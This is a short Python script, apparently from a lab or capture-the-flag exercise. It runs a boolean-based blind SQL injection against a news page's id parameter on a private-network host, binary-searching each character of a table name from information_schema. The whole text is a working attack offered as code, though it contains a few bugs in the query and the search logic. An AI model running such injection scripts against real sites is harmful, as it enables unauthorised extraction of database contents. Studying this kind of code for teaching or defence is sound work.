import requests


for i in range(30):
    l=0
    r=200
    while(l<=r):
        if(l>=r):
            print chr(l)
            break
        m=(l+r)/2
        
        payload= '1 and (select ascii(mid(table_name,'+str(i+1)+',1)) > ' + str(m) + 'from information_schema.table)'
        req= requests.get("http://192.168.4.44:4002/news.php?id=" +payload)

        if "The id doesn't exist." in req.text:
            r=m
        else:
            l=m+1